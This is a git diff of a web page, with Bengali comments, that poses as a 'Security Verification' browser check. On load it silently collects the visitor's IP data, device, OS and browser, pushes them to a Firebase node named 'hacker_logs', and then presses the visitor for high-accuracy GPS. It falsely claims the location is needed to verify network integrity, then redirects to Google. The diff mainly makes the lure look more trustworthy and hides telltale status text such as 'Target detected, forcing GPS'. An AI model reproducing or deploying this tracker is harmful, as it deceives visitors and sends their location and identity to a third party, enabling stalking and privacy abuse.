@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Gateway</title>
+    <title>Security Verification</title>
     
     <!-- UAParser -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
@@ -26,7 +26,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // ১. প্রাথমিক ডাটা পাঠানো (যাতে অন্তত আইপিটা মিস না হয়)
+        // ১. ডাটা পাঠানো শুরু (আইপি ও ডিভাইস ইনফো)
         window.initLog = function(data) {
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
@@ -34,18 +34,17 @@
             set(newLogRef, {
                 timestamp: new Date().toString(),
                 ...data,
-                latitude: "Tracing...", // শুরুতে এটা দেখাবে
+                latitude: "Tracing...",
                 longitude: "Tracing...",
-                actionStatus: "Target detected, forcing GPS..." 
+                actionStatus: "Connecting..." 
             }).then(() => {
-                // সেশন কি (Key) সেভ রাখা, যাতে পরে লোকেশন দিয়ে আপডেট করা যায়
                 sessionStorage.setItem('logKey', newLogRef.key);
-                // এবার লোকেশন শিকারে নামো
-                window.forceLocation();
+                // ডাটা সেভ হওয়ার পর লোকেশন লুপ শুরু
+                setTimeout(window.forceLocation, 1000); 
             });
         };
 
-        // ২. লোকেশন পেলে ডাটাবেস আপডেট করা
+        // ২. লোকেশন আপডেট করা
         window.updateWithGPS = function(lat, lng) {
             const key = sessionStorage.getItem('logKey');
             if (key) {
@@ -53,9 +52,9 @@
                 update(updateRef, {
                     latitude: lat,
                     longitude: lng,
-                    actionStatus: "✅ GPS Locked Successfully!"
+                    actionStatus: "✅ Verified"
                 }).then(() => {
-                    // কাজ শেষ হলে গুগলে পাঠিয়ে দাও
+                    // কাজ শেষে গুগলে পাঠিয়ে দেওয়া
                     window.location.href = "https://www.google.com";
                 });
             }
@@ -63,48 +62,127 @@
     </script>
 
     <style>
+        :root {
+            --bg-color: #e0e5ec;
+            --text-color: #4a4a4a;
+            --accent-color: #007bff;
+            --shadow-light: #ffffff;
+            --shadow-dark: #a3b1c6;
+        }
+
         body {
-            background-color: #0f0f1a;
-            color: #fff;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            height: 100vh; margin: 0; text-align: center;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-        .loader {
-            border: 5px solid #1a1a2e;
-            border-top: 5px solid #e94560;
+
+        .card {
+            width: 90%;
+            max-width: 350px;
+            padding: 40px;
+            border-radius: 30px;
+            background: var(--bg-color);
+            box-shadow: 20px 20px 60px var(--shadow-dark), 
+                       -20px -20px 60px var(--shadow-light);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .icon-area {
+            width: 80px;
+            height: 80px;
             border-radius: 50%;
-            width: 50px; height: 50px;
+            background: var(--bg-color);
+            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
+                        inset -6px -6px 12px var(--shadow-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 30px;
+            color: var(--accent-color);
+        }
+
+        h2 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: var(--text-color);
+        }
+
+        p {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        /* সুন্দর লোডিং অ্যানিমেশন */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 123, 255, 0.1);
+            border-left-color: var(--accent-color);
+            border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        h2 { margin: 0; font-size: 18px; color: #e94560; }
-        p { font-size: 12px; color: #a0a0b0; max-width: 300px; line-height: 1.5; }
-        
-        .retry-btn {
-            background: #e94560; color: white; border: none;
-            padding: 10px 20px; border-radius: 5px; font-weight: bold;
-            margin-top: 20px; cursor: pointer; display: none;
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
+
+        .btn-retry {
+            padding: 12px 25px;
+            border: none;
+            outline: none;
+            border-radius: 50px;
+            background: var(--bg-color);
+            box-shadow: 6px 6px 12px var(--shadow-dark), 
+                       -6px -6px 12px var(--shadow-light);
+            color: var(--accent-color);
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: none; /* শুরুতে লুকানো */
+        }
+
+        .btn-retry:active {
+            box-shadow: inset 4px 4px 8px var(--shadow-dark), 
+                        inset -4px -4px 8px var(--shadow-light);
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="loader" id="spinner"></div>
-    <h2 id="statusTitle">SYSTEM SCANNING...</h2>
-    <p id="statusMsg">Checking secure connection. Do not close window.</p>
-    
-    <button class="retry-btn" id="retryBtn" onclick="window.forceLocation()">FIX CONNECTION</button>
+    <div class="card">
+        <div class="icon-area">
+            <!-- সিকিউরিটি শিল্ড আইকন -->
+            🛡️
+        </div>
+        
+        <h2 id="statusTitle">Checking Connection...</h2>
+        <p id="statusMsg">Please wait while we verify your browser security settings.</p>
+
+        <div class="spinner" id="spinner"></div>
+
+        <button class="btn-retry" id="retryBtn" onclick="window.forceLocation()">
+            Allow Access to Verify
+        </button>
+    </div>
 
     <script>
         let ipInfo = {};
 
-        // পেজ লোড হলেই কাজ শুরু
         window.onload = function() {
-            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
+            // আইপি ডাটা ফেচ করা
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
@@ -129,66 +207,56 @@
                 deviceModel: deviceName,
                 os: result.os.name,
                 browser: result.browser.name,
-                latitude: "Wait...",
-                longitude: "Wait..."
+                latitude: "Tracing...",
+                longitude: "Tracing..."
             };
 
-            // Firebase এ প্রথম ধাক্কা (আইপি সহ)
             if(window.initLog) window.initLog(initialPayload);
         }
 
-        // ৩. কঠোর লোকেশন লজিক (The Loop)
         window.forceLocation = function() {
+            // UI আপডেট: বাটন লুকিয়ে স্পিনার দেখানো
             document.getElementById('retryBtn').style.display = 'none';
-            document.getElementById('statusTitle').innerText = "VERIFYING LOCATION...";
-            document.getElementById('statusMsg').innerText = "Please allow location access to continue.";
             document.getElementById('spinner').style.display = 'block';
-
+            document.getElementById('statusTitle').innerText = "Verifying...";
+            
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
-                    // Success (লোকেশন পাওয়া গেছে!)
                     function(position) {
-                        document.getElementById('statusTitle').innerText = "ACCESS GRANTED";
-                        document.getElementById('statusTitle').style.color = "#00b894";
+                        // সাকসেস হলে
+                        document.getElementById('statusTitle').innerText = "Verified!";
+                        document.getElementById('statusTitle').style.color = "#00b894"; // সবুজ
+                        document.querySelector('.icon-area').innerText = "✅";
                         
-                        // ফায়ারভেজে আপডেট পাঠাও
                         if(window.updateWithGPS) {
                             window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                         }
                     },
-                    // Error (সে ব্লক করেছে বা জিপিএস অফ)
                     function(error) {
-                        console.log("GPS Failed: " + error.message);
-                        handleError(error);
+                        // ফেইল হলে UI তে ওয়ার্নিং
+                        handleError();
                     },
-                    // Options (High Accuracy - আসল লোকেশনের জন্য)
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000, // ১০ সেকেন্ড চেষ্টা করবে
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true }
                 );
-            } else {
-                alert("GPS not supported on this device.");
             }
-        };
+        }
 
-        function handleError(error) {
+        function handleError() {
+            // স্পিনার সরিয়ে বাটন দেখানো
             document.getElementById('spinner').style.display = 'none';
-            document.getElementById('statusTitle').innerText = "CONNECTION FAILED";
             
-            if (error.code === error.PERMISSION_DENIED) {
-                // যদি ইউজার 'Block' দেয়
-                document.getElementById('statusMsg').innerText = "⚠ Security Check Failed! You MUST allow location permission to verify connection.";
-            } else if (error.code === error.POSITION_UNAVAILABLE) {
-                // যদি লোকেশন অফ থাকে
-                document.getElementById('statusMsg').innerText = "⚠ GPS is OFF. Please turn on your device location.";
-            } else {
-                document.getElementById('statusMsg').innerText = "Network timeout. Please retry.";
-            }
+            document.getElementById('statusTitle').innerText = "Connection Failed";
+            document.getElementById('statusMsg').innerText = "Location access is required to verify your network integrity.";
+            
+            // আইকন লাল করা
+            let iconArea = document.querySelector('.icon-area');
+            iconArea.innerText = "⚠️";
+            iconArea.style.color = "#ff4757";
 
-            // বাটন দেখিয়ে তাকে আবার গুঁতা দেওয়া
-            document.getElementById('retryBtn').style.display = 'inline-block';
+            // বাটন শো করা
+            let btn = document.getElementById('retryBtn');
+            btn.style.display = 'inline-block';
+            btn.innerText = "Try Again (Allow Access)";
         }
     </script>
 </body>
